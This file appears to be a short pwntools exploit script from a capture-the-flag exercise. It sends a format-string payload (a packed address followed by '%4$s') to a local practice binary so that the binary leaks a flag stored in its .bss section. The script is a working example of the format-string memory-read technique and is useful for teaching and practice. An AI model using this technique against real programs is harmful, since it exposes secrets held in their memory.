from pwn import *

p = process("./Formatstring-leak-flag-in-mem-bss")

payload = p32(0x804A060) + b'%4$s\x00'
p.sendline(payload)

p.interactive()